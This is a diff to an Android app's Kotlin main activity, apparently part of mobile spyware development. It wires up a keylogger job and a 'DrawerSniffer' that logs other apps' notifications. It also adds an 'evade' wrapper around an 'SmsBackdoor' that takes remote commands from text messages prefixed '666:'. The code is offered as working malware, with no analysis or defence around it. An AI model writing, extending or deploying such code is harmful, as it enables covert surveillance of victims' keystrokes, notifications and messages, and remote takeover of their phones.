@@ -46,13 +46,14 @@ class MainActivity : AppCompatActivity() {
                     }
                 }
                 launch {
-                    DrawerSniffer.subscribe { notification ->
+                    DrawerSniffer.subscribe(this@MainActivity) { notification ->
                         Log.d("DRAWERSNIFFER", notification.toString())
                     }
                 }.join()
                 keyloggerJob.join()
             }
         }
+        evade {
             KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS).onAccepted {
                 SmsBackdoor.openDoor(this, "666:", payload = payload){ remoteCommand ->
                     when(remoteCommand){
@@ -66,6 +67,5 @@ class MainActivity : AppCompatActivity() {
                 if(!DrawerSniffer.hasPermission(this))
                     DrawerSniffer.requestPermission(this)
             }.ask()
-
     }
 }
